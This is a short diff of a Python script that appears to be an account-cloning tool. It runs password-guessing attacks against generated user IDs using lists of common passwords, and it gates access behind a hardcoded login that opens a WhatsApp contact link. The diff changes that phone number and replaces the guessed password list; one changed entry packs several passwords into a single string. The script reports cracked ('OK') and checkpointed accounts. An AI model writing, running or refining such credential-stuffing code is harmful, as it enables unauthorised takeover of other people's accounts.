@@ -357,7 +357,7 @@ print("\033[93;1mNote: \033[91;1mMessage the admin on WhatsApp to get the passwo
 print("\033[95;1m")
 while attemps < 12345677901:
       username = input('ENTER USERNAME :')
-      os.system("xdg-open https://wa.me/+8801750017124")
+      os.system("xdg-open https://wa.me/+881843438888")
       password = input('ENTER PASSWORD :')
       if username == 'Uzzal Islam' and password == 'Uzzal404':
          print('You Have Successfully Logged in.')
@@ -608,7 +608,7 @@ def Ulti():
         print(f'{RED}=========================================================')
         for love in user:
             uid = code+love
-            pwx = [love,'khan1122','i love you','khankhan',]
+            pwx = [love,'first123','lasts1234','bangldesh, first1@,last@,mohammd@',]
             manshera.submit(freeq,uid,pwx,tl)
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
